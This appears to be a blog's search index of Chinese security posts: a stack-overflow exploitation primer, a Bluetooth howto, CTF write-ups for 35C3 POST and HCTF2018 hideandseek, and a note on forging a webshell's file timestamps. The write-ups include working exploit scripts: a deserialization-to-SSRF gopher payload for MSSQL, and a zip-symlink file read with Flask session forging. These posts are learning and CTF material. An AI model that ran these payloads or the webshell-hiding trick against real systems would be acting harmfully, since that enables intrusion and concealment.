<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[pwn入门]]></title>
    <url>%2F2019%2F09%2F09%2Fpwn%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[常见寄存器说明ESP：用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。 EBP：用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。 EIP： 用来存储即将执行的程序指令的地址，CPU依照 EIP 的存储内容读取指令并执行，EIP随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。 函数调用时栈区变化 参数逆序入栈 将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 EIP（指令）信息得以保存。 再将当前的EBP 寄存器的值（也就是调用函数的基地址）压入栈内，并将 EBP 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 EBP （基地址）信息得以保存。同时，EBP 被更新为被调用函数（callee）的基地址。 将被调用函数的局部变量压入栈内，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。 看过了函数调用发生时的情况，就不难理解函数调用结束时的变化。变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。 首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。 然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 EBP寄存器内。这样调用函数（caller）的 EBP（基地址）信息得以恢复。此时栈顶会指向返回地址。 再将返回地址从栈内弹出，并存到 EIP 寄存器内。这样调用函数（caller）的 EIP（指令）信息得以恢复。 栈溢出当函数正在执行内部指令的过程中我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时才可以通过修改函数状态来实现攻击。 我们的目标就是让 EIP 载入攻击指令的地址 在退栈过程中，返回地址会被传给 EIP，所以我们只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。 我们也可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。 我们要做的就是将原本EIP指定的函数在调用时替换为其他函数。 栈溢出技术种类 修改返回地址，让其指向溢出数据中的一段指令（shellcode） 修改返回地址，让其指向内存中已有的某个函数（return2libc） 修改返回地址，让其指向内存中已有的一段指令（ROP） 修改某个被调用函数的地址，让其指向另一个函数（hijack GOT） shellcodepayload : padding1 + address of shellcode + padding2 + shellcode padding1 处的数据可以随意填充（注意如果利用字符串程序输入溢出数据不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of shellcode 是后面 shellcode 起始处的地址，用来覆盖返回地址。padding2 处的数据也可以随意填充，长度可以任意。shellcode 应该为十六进制的机器码格式。 根据上面的构造，我们要解决两个问题。 返回地址之前的填充数据（padding1）应该多长？ 我们可以用调试工具（例如 gdb）查看汇编代码来确定这个距离，也可以在运行程序时用不断增加输入长度的方法来试探（如果返回地址被无效地址例如“AAAA”覆盖，程序会终止并报错）。 shellcode起始地址应该是多少？ 我们可以在调试工具里查看返回地址的位置（可以查看 EBP 的内容然后再加4（32位机），参见前面关于函数状态的解释），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，解决办法是在 padding2 里填充若干长度的 “\x90”。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled（中文含义是“滑雪橇”）。这样我们就可以通过增加 NOP 填充来配合试验 shellcode 起始地址。 操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即Address Space Layout Randomization (ASLR) ），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定 shellcode 的起始地址。 解决完上述问题，我们就可以拼接出最终的溢出数据，输入至程序来执行 shellcode 了。 这种方法生效的一个前提是在函数调用栈上的数据（shellcode）要有可执行的权限（另一个前提是上面提到的关闭内存布局随机化）。很多时候操作系统会关闭函数调用栈的可执行权限，这样 shellcode 的方法就失效了，不过我们还可以尝试使用内存里已有的指令或函数，毕竟这些部分本来就是可执行的，所以不会受上述执行权限的限制。这就包括 return2libc 和 ROP 两种方法。 Return2libc在内存中确定某个函数的地址，并用其覆盖掉返回地址。由于 libc 动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如 system() 等），所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用 system() 函数打开 shell 的完整形式为 system(“/bin/sh”) ，所以溢出数据也要包括必要的参数。下面就以执行 system(“/bin/sh”) 为例，先写出溢出数据的组成，再确定对应的各部分填充进去。 payload: padding1 + address of system() + padding2 + address of “/bin/sh” padding1 处的数据可以随意填充（注意不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system() 是 system() 在内存中的地址，用来覆盖返回地址。padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址。因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。address of “/bin/sh” 是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。 根据上面的构造，我们要解决个问题。 返回地址之前的填充数据（padding1）应该多长？ 解决方法和 shellcode 中提到的答案一样。 system() 函数地址应该是多少？ 要回答这个问题，就要看看程序是如何调用动态链接库中的函数的。当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。说到确定动态库的内存地址，就要回顾一下 shellcode 中提到的内存布局随机化（ASLR），这项技术也会将动态库加载的起始地址做随机化处理。所以，如果操作系统打开了 ASLR，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 ASLR 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。 最后，“/bin/sh” 的地址在哪里？ 可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。 解决完上述问题，我们就可以拼接出溢出数据，输入至程序来通过 system() 打开 shell 了。 以上两种方案都需要操作系统关闭布局随机化（ASLR）两种方法都是通过覆盖返回地址来执行输入的指令片段（shellcode）或者动态库中的函数（return2libc）。需要指出的是，这两种方法都需要操作系统关闭内存布局随机化（ASLR），而且 shellcode 还需要程序调用栈有可执行权限。 下面的另外两种执行方法，其中有可以绕过内存布局随机化（ASLR）的方法，敬请关注。]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取你耳机的蓝牙版本]]></title>
    <url>%2F2019%2F08%2F27%2F%E8%8E%B7%E5%8F%96%E4%BD%A0%E8%80%B3%E6%9C%BA%E7%9A%84%E8%93%9D%E7%89%99%E7%89%88%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[蓝牙耳机在各大手机厂干掉了耳机口之后，他们就可以更好地卖蓝牙耳机了。 各大，卖点也出来了，什么TWS，蓝牙5.0，aptx，aac，ldac等等 TWS：为True Wireless Stereo的缩写，是真正无线立体声 蓝牙5.0：于美国时间2016年6月16日在伦敦正式发布,为现阶段最高级的蓝牙协议标准。 但是怎么知道一款耳机到底是不是蓝牙5.0呢？而它具体的芯片是哪一款呢？这些很多厂家都不会告诉你。 获取你耳机的蓝牙版本 以小米手机为例，开启开发者模式的蓝牙抓包日志 如图上白点处，各手机操作差不多 将系统存储目录下的./MUIU/debug_log/common/btsnoop_hci.log（不同的手机这个文件的位置不同，可以自行搜索确认。还有的手机可能需要root权限，在/data/misc/bluetooth/logs下面）文件发送至电脑 使用wireshark打开日志文件，搜索Read Remote Version Information Complete 在红线的位置即可查看目标设备的蓝牙版本号和芯片厂家 协议的文档读的头疼，剩下的可能懒得看了0.0]]></content>
  </entry>
  <entry>
    <title><![CDATA[35C3-POST]]></title>
    <url>%2F2019%2F04%2F19%2F2019-4-19-35C3-POST%2F</url>
    <content type="text"><![CDATA[35C3-POST扫描目录得到uploads目录，测试目录穿越成功，得到nginx备份文件和源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546server &#123; listen 80; access_log /var/log/nginx/example.log; server_name localhost; root /var/www/html; location /uploads &#123; autoindex on; alias /var/www/uploads/; &#125; location / &#123; alias /var/www/html/; index index.php; location ~ \.php$ &#123; include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; &#125; &#125; location /inc/ &#123; deny all; &#125;&#125;server &#123; listen 127.0.0.1:8080; access_log /var/log/nginx/proxy.log; if ( $request_method !~ ^(GET)$ ) &#123; return 405; &#125; root /var/www/miniProxy; location / &#123; index index.php; location ~ \.php$ &#123; include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; &#125; &#125; &#125; 由于 url 没加后缀 /，而 alias 设置了有后缀 / 配置，导致可以利用 ../ 绕过限制访问目录。 db.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpclass DB &#123; private static $con; private static $init = false; private static function initialize() &#123; DB::$con = sqlsrv_connect("db", array("pwd"=&gt; "Foobar1!", "uid"=&gt;"challenger", "Database"=&gt;"challenge")); if (!DB::$con) DB::error(); DB::$init = true; &#125; private static function error() &#123; die("db error"); &#125; private static function prepare_params($params) &#123; return array_map(function($x)&#123; if (is_object($x) or is_array($x)) &#123; return '$serializedobject$' . serialize($x); &#125; if (preg_match('/^\$serializedobject\$/i', $x)) &#123; die("invalid data"); return ""; &#125; return $x; &#125;, $params); &#125; private static function retrieve_values($res) &#123; $result = array(); while ($row = sqlsrv_fetch_array($res)) &#123; $result[] = array_map(function($x)&#123; return preg_match('/^\$serializedobject\$/i', $x) ? unserialize(substr($x, 18)) : $x; &#125;, $row); &#125; return $result; &#125; public static function query($sql, $values=array()) &#123; if (!is_array($values)) $values = array($values); if (!DB::$init) DB::initialize(); $res = sqlsrv_query(DB::$con, $sql, $values); if ($res === false) DB::error(); return DB::retrieve_values($res); &#125; public static function insert($sql, $values=array()) &#123; if (!is_array($values)) $values = array($values); if (!DB::$init) DB::initialize(); $values = DB::prepare_params($values); $x = sqlsrv_query(DB::$con, $sql, $values); if (!$x) throw new Exception; &#125;&#125; default.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?php include 'inc/post.php';?&gt;&lt;?php if (isset($_POST["title"])) &#123; $attachments = array(); if (isset($_FILES["attach"]) &amp;&amp; is_array($_FILES["attach"])) &#123; $folder = sha1(random_bytes(10)); mkdir("../uploads/$folder"); for ($i = 0; $i &lt; count($_FILES["attach"]["tmp_name"]); $i++) &#123; if ($_FILES["attach"]["error"][$i] !== 0) continue; $name = basename($_FILES["attach"]["name"][$i]); move_uploaded_file($_FILES["attach"]["tmp_name"][$i], "../uploads/$folder/$name"); $attachments[] = new Attachment("/uploads/$folder/$name"); &#125; &#125; $post = new Post($_POST["title"], $_POST["content"], $attachments); $post-&gt;save(); &#125; if (isset($_GET["action"])) &#123; if ($_GET["action"] == "restart") &#123; Post::truncate(); header("Location: /"); die; &#125; else &#123;?&gt;&lt;h2&gt;Create new post&lt;/h2&gt;&lt;form method="POST" enctype="multipart/form-data"&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;label for="title"&gt;Title&lt;/label&gt;&lt;/td&gt; &lt;td&gt;&lt;input name="title"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;label for="content"&gt;Content&lt;/label&gt;&lt;/td&gt; &lt;td&gt;&lt;input name="content"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;label for="attach"&gt;Attachments&lt;/label&gt;&lt;/td&gt; &lt;td&gt;&lt;input name="attach[]" type="file"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;input name="attach[]" type="file"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;input name="attach[]" type="file"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="submit"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&lt;?php &#125; &#125; $posts = Post::loadall(); if (empty($posts)) &#123; echo "&lt;b&gt;You do not have any posts. Create &lt;a href=\"/?action=create\"&gt;some&lt;/a&gt;!&lt;/b&gt;"; &#125; else &#123; echo "&lt;b&gt;You have " . count($posts) ." posts. Create &lt;a href=\"/?action=create\"&gt;some&lt;/a&gt; more if you want! Or &lt;a href=\"/?action=restart\"&gt;restart your blog&lt;/a&gt;.&lt;/b&gt;"; &#125; foreach($posts as $p) &#123; echo $p; echo "&lt;br&gt;&lt;br&gt;"; &#125;?&gt; post.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;?phpclass Attachment &#123; private $url = NULL; private $za = NULL; private $mime = NULL; public function __construct($url) &#123; $this-&gt;url = $url; $this-&gt;mime = (new finfo)-&gt;file("../".$url); if (substr($this-&gt;mime, 0, 11) == "Zip archive") &#123; $this-&gt;mime = "Zip archive"; $this-&gt;za = new ZipArchive; &#125; &#125; public function __toString() &#123; $str = "&lt;a href='&#123;$this-&gt;url&#125;'&gt;".basename($this-&gt;url)."&lt;/a&gt; ($this-&gt;mime "; if (!is_null($this-&gt;za)) &#123; $this-&gt;za-&gt;open("../".$this-&gt;url); $str .= "with ".$this-&gt;za-&gt;numFiles . " Files."; &#125; return $str. ")"; &#125; &#125; class Post &#123; private $title = NULL; private $content = NULL; private $attachment = NULL; private $ref = NULL; private $id = NULL; public function __construct($title, $content, $attachments="") &#123; $this-&gt;title = $title; $this-&gt;content = $content; $this-&gt;attachment = $attachments; &#125; public function save() &#123; global $USER; if (is_null($this-&gt;id)) &#123; DB::insert("INSERT INTO posts (userid, title, content, attachment) VALUES (?,?,?,?)", array($USER-&gt;uid, $this-&gt;title, $this-&gt;content, $this-&gt;attachment)); &#125; else &#123; DB::query("UPDATE posts SET title = ?, content = ?, attachment = ? WHERE userid = ? AND id = ?", array($this-&gt;title, $this-&gt;content, $this-&gt;attachment, $USER-&gt;uid, $this-&gt;id)); &#125; &#125; public static function truncate() &#123; global $USER; DB::query("DELETE FROM posts WHERE userid = ?", array($USER-&gt;uid)); &#125; public static function load($id) &#123; global $USER; $res = DB::query("SELECT * FROM posts WHERE userid = ? AND id = ?", array($USER-&gt;uid, $id)); if (!$res) die("db error"); $res = $res[0]; $post = new Post($res["title"], $res["content"], $res["attachment"]); $post-&gt;id = $id; return $post; &#125; public static function loadall() &#123; global $USER; $result = array(); $posts = DB::query("SELECT id FROM posts WHERE userid = ? ORDER BY id DESC", array($USER-&gt;uid)) ; if (!$posts) return $result; foreach ($posts as $p) &#123; $result[] = Post::load($p["id"]); &#125; return $result; &#125; public function __toString() &#123; $str = "&lt;h2&gt;&#123;$this-&gt;title&#125;&lt;/h2&gt;"; $str .= $this-&gt;content; $str .= "&lt;hr&gt;Attachments:&lt;br&gt;&lt;il&gt;"; foreach ($this-&gt;attachment as $attach) &#123; $str .= "&lt;li&gt;$attach&lt;/li&gt;"; &#125; $str .= "&lt;/il&gt;"; return $str; &#125;&#125; 可以发现DB类的query方法把接收sql语句后把执行结果丢给了retrieve_values方法，而该方法存在一处反序列化操作，且要求反序列化字符串开头为$serializedobject$ 在 mssql 中,MSSQL会自动将全角unicode字符转换为ASCII表示形式，$s℮rializedobject$ 入库后会变成 $serializedobject$ ，注意前者的℮不是 ASCII 的 e，整个字符串的 16 进制如下，可见前者的℮的 hex 是 E284AE，而后者 e 的 ASCII 是 0x65 根据post.php，可以通过SoapClient通过SSRF打MSSQL，前提是要能够触发它的call方法。 类Attachment的tostring方法中有一个$this-&gt;za-&gt;open操作，我们将SoapClient序列化为$za，然后触发其__tostring`方法即可SSRF。 而default.php中实例化了Post类，把$_POST[&quot;title&quot;], $_POST[&quot;content&quot;], $attachments传了进去，并调用了save方法 然后又调用loadall()方法执行数据库查询操作，此时会将返回值开头为$serializedobject$的字符串进行反序列化操作并将返回的值打印触发Post类的__toString方法，而返回值含有反序列化对象，因此又可以触发反序列化对象的__toString方法，从而可以SSRF。 exp： 12345678910&lt;?phpclass Attachment &#123; private $za = NULL; public function __construct() &#123; $this-&gt;za = new SoapClient(null,array('location'=&gt;'your_ip','uri'=&gt;'your_ip')); &#125;&#125;$c=new Attachment();$aaa=serialize($c);echo $aaa; 由Nginx配置文件可知，miniProxy代理监听在本地的8080端口，且只接收Get请求,而SoapClient发送的是POST请求。 得知SoapClientl的_user_agent属性存在CRLF注入，我们可以通过\r\n再注入一个GET请求。另外miniProxy只能代理 http / https请求,可以通过gopher:///绕过，因为miniProxy仅在设置host时验证http / https。或者可以重定向到一个gopher请求来绕过。 gopher会在请求后加上一个\r\n ，因此构造gopher请求时要在sql语句后加一个注释符-- -, 通过插入DEBUG头我们可以获取到我们的UID exp： 12345678910111213141516171819202122import requestsimport base64 host="http://50.3.232.201:8000/?"post=&#123; "username":"123456", "password":"123456",&#125; r=requests.Session()url1=host+"page=login"r.post(url=url1,data=post)def fetch_uid(): return r.get(host, headers=&#123;"Debug": "1"&#125;).content.decode().split("int(")[1].split(")")[0]payload=base64.b64decode("JHNlcmlhbGl6ZWRvYmplY3TvvIRPOjEwOiJBdHRhY2htZW50IjoxOntzOjI6InphIjtPOjEwOiJTb2FwQ2xpZW50IjozOntzOjM6InVyaSI7czozNToiaHR0cDovL2xvY2FsaG9zdDo4MDgwL21pbmlQcm94eS5waHAiO3M6ODoibG9jYXRpb24iO3M6MzU6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9taW5pUHJveHkucGhwIjtzOjExOiJfdXNlcl9hZ2VudCI7czoxMzk5OiJBQUFBQUhhaGEKCkdFVCAvbWluaVByb3h5LnBocD9nb3BoZXI6Ly8vZGI6MTQzMy9BJTEyJTAxJTAwJTJGJTAwJTAwJTAxJTAwJTAwJTAwJTFBJTAwJTA2JTAxJTAwJTIwJTAwJTAxJTAyJTAwJTIxJTAwJTAxJTAzJTAwJTIyJTAwJTA0JTA0JTAwJTI2JTAwJTAxJUZGJTAwJTAwJTAwJTAxJTAwJTAxJTAyJTAwJTAwJTAwJTAwJTAwJTAwJTEwJTAxJTAwJURFJTAwJTAwJTAxJTAwJUQ2JTAwJTAwJTAwJTA0JTAwJTAwdCUwMCUxMCUwMCUwMCUwMCUwMCUwMCUwMFQwJTAwJTAwJTAwJTAwJTAwJTAwJUUwJTAwJTAwJTA4JUM0JUZGJUZGJUZGJTA5JTA0JTAwJTAwJTVFJTAwJTA3JTAwbCUwMCUwQSUwMCU4MCUwMCUwOCUwMCU5MCUwMCUwQSUwMCVBNCUwMCUwOSUwMCVCNiUwMCUwMCUwMCVCNiUwMCUwNyUwMCVDNCUwMCUwMCUwMCVDNCUwMCUwOSUwMCUwMSUwMiUwMyUwNCUwNSUwNiVENiUwMCUwMCUwMCVENiUwMCUwMCUwMCVENiUwMCUwMCUwMCUwMCUwMCUwMCUwMGElMDB3JTAwZSUwMHMlMDBvJTAwbSUwMGUlMDBjJTAwaCUwMGElMDBsJTAwbCUwMGUlMDBuJTAwZyUwMGUlMDByJTAwJUMxJUE1UyVBNVMlQTUlODMlQTUlQjMlQTUlODIlQTUlQjYlQTUlQjclQTVuJTAwbyUwMGQlMDBlJTAwLSUwMG0lMDBzJTAwcyUwMHElMDBsJTAwbCUwMG8lMDBjJTAwYSUwMGwlMDBoJTAwbyUwMHMlMDB0JTAwVCUwMGUlMDBkJTAwaSUwMG8lMDB1JTAwcyUwMGMlMDBoJTAwYSUwMGwlMDBsJTAwZSUwMG4lMDBnJTAwZSUwMCUwMSUwMSUwMSUwRSUwMCUwMCUwMSUwMCUxNiUwMCUwMCUwMCUxMiUwMCUwMCUwMCUwMiUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMSUwMCUwMCUwMGklMDBuJTAwcyUwMGUlMDByJTAwdCUwMCUyMCUwMGklMDBuJTAwdCUwMG8lMDAlMjAlMDBwJTAwbyUwMHMlMDB0JTAwcyUwMCUyMCUwMCUyOCUwMHUlMDBzJTAwZSUwMHIlMDBpJTAwZCUwMCUyQyUwMCUyMCUwMHQlMDBpJTAwdCUwMGwlMDBlJTAwJTJDJTAwJTIwJTAwYyUwMG8lMDBuJTAwdCUwMGUlMDBuJTAwdCUwMCUyQyUwMCUyMCUwMGElMDB0JTAwdCUwMGElMDBjJTAwaCUwMG0lMDBlJTAwbiUwMHQlMDAlMjklMDAlMjAlMDB2JTAwYSUwMGwlMDB1JTAwZSUwMHMlMDAlMjAlMDAlMjglMDAyJTAwMCUwMDAlMDAlMkMlMDAlMjAlMDAlMjIlMDB0JTAwZSUwMHMlMDB0JTAwJTIyJTAwJTJDJTAwJTIwJTAwJTI4JTAwcyUwMGUlMDBsJTAwZSUwMGMlMDB0JTAwJTIwJTAwZiUwMGwlMDBhJTAwZyUwMCUyMCUwMGYlMDByJTAwbyUwMG0lMDAlMjAlMDBmJTAwbCUwMGElMDBnJTAwLiUwMGYlMDBsJTAwYSUwMGclMDAlMjklMDAlMkMlMDAlMjAlMDAlMjIlMDB0JTAwZSUwMHMlMDB0JTAwJTIyJTAwJTI5JTAwJTNCJTAwJTNCJTAwLSUwMC0lMDAlMjAlMDAtJTAwIEhUVFAvMS4xCkhvc3Q6IGxvY2FsaG9zdAoKIjt9fQ==")print(payload)data=&#123; "title":"123456", "content":payload,&#125;url2=host+"action=create"r.post(url=url2,data=data)]]></content>
  </entry>
  <entry>
    <title><![CDATA[HCTF2018-hideandseek]]></title>
    <url>%2F2018%2F12%2F19%2FHCTF2018-hideandseek%2F</url>
    <content type="text"><![CDATA[hide and seek经过注册登陆后发现有上传点，发现只能上传zip文件，然后发现zip中压缩的文件内容会被解压后输出在页面上，上传php马失败 尝试读取linux下的环境变量：/proc/self/environ 1UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=c52b2c48ec0bSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.15.8-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.15.8.0.2.7-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.8NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0 找到 /app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini文件 读取这个文件 得到： 1[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app 再读/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 得到 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586# -*- coding: utf-8 -*-from flask import Flask,session,render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config['SECRET_KEY'] = str(random.random()*100)app.config['UPLOAD_FOLDER'] = './uploads'app.config['MAX_CONTENT_LENGTH'] = 100 * 1024ALLOWED_EXTENSIONS = set(['zip'])def allowed_file(filename): return '.' in filename and \ filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/', methods=['GET'])def index(): error = request.args.get('error', '') if(error == '1'): session.pop('username', None) return render_template('index.html', forbidden=1) if 'username' in session: return render_template('index.html', user=session['username'], flag=flag.flag) else: return render_template('index.html')@app.route('/login', methods=['POST'])def login(): username=request.form['username'] password=request.form['password'] if request.method == 'POST' and username != '' and password != '': if(username == 'admin'): return redirect(url_for('index',error=1)) session['username'] = username return redirect(url_for('index'))@app.route('/logout', methods=['GET'])def logout(): session.pop('username', None) return redirect(url_for('index'))@app.route('/upload', methods=['POST'])def upload_file(): if 'the_file' not in request.files: return redirect(url_for('index')) file = request.files['the_file'] if file.filename == '': return redirect(url_for('index')) if file and allowed_file(file.filename): filename = secure_filename(file.filename) file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename) if(os.path.exists(file_save_path)): return 'This file already exists' file.save(file_save_path) else: return 'This file is not a zipfile' try: extract_path = file_save_path + '_' os.system('unzip -n ' + file_save_path + ' -d '+ extract_path) read_obj = os.popen('cat ' + extract_path + '/*') file = read_obj.read() read_obj.close() os.system('rm -rf ' + extract_path) except Exception as e: file = None os.remove(file_save_path) if(file != None): if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1): return redirect(url_for('index', error=1)) return Response(file)if __name__ == '__main__': #app.run(debug=True) app.run(host='127.0.0.1', debug=True, port=10008) 发现随机数种子不安全:由uuid.getnode()获得为固定mac地址 123random.seed(uuid.getnode())app = Flask(__name__)app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100) 所以读取mac地址/sys/class/net/eth0/address mac：02:42:ac:11:00:02–&gt;2485377892354 用python3执行 1python3 -c "import random;random.seed(2485377892354);print (str(random.random()*100))" 得到secret_key=42.42408197657815 伪造session: eyJ1c2VybmFtZSI6ImFkbWluIn0.XFk6SQ.dp9Uh_Kd6tGKQ12uY7eqoSzvrPo 得到flag：hctf{2495e2ef667b367a0738f5eae9d6afb983c2} 贴上百度找的脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python3# coding=utf-8import requestsimport randomimport reimport osfrom flask import Flaskfrom flask.sessions import SecureCookieSessionInterfacedef read_file(file_name): link(file_name) files = &#123;'the_file': open(file_name[-5:] + '.zip', 'rb')&#125; r2 = s.post(url+'upload', files=files) return r2.textdef link(file_name): os.system('ln -s &#123;file_name&#125; &#123;output&#125;'.format(file_name = file_name, output = file_name[-5:])) os.system('zip -y -m &#123;output&#125;.zip &#123;output&#125;'.format(file_name = file_name, output = file_name[-5:]))url = 'http://hideandseek.2018.hctf.io/'with requests.Session() as s: user_data = &#123;'username': '123', 'password': '123456789'&#125; r = s.post(url+'login', data=user_data) en = read_file('/proc/self/environ') print(en) ini = re.search('UWSGI_INI=(.*?)\x00', en).group(1) pwd = re.search('PWD=(.*?)\x00', en).group(1) print(ini) print(pwd) ini = read_file(ini) print(ini) source = re.search('module = .*?\.(.*?)\n', ini).group(1) source = pwd+'/'+source+'.py' source = read_file(source) print(source) if(source.find('import') == -1): exit('fail') mac = '/sys/class/net/eth0/address' mac = read_file(mac) mac = mac[:-1] mac = ''.join(mac.split(':')) mac = int(mac, 16) print(mac) random.seed(mac) key = random.random()*100 print(key)app = Flask(__name__)app.config['SECRET_KEY'] = str(key)payload = &#123;'username': 'admin'&#125;serializer = SecureCookieSessionInterface().get_signing_serializer(app)session = serializer.dumps(payload)print(session)cookies = &#123;'session': session&#125;r = requests.get(url, cookies=cookies)print(r.text)]]></content>
  </entry>
  <entry>
    <title><![CDATA[自用Linux命令手册]]></title>
    <url>%2F2018%2F11%2F11%2F%E8%87%AA%E7%94%A8Linux%E5%91%BD%E4%BB%A4%E6%89%8B%E5%86%8C%2F</url>
    <content type="text"><![CDATA[Linux/Unix 修改文件时间戳Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。 比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。 利用方法 touch -r index.php webshell.php 或者直接将时间戳修改成某年某月某日。如下 2018 年 11 月 11 日。 touch -t 1811111042.30 webshell.php]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux后门总结]]></title>
    <url>%2F2018%2F11%2F07%2F2018-11-7-Linux%E5%90%8E%E9%97%A8%E6%80%BB%E7%BB%93%2F</url>
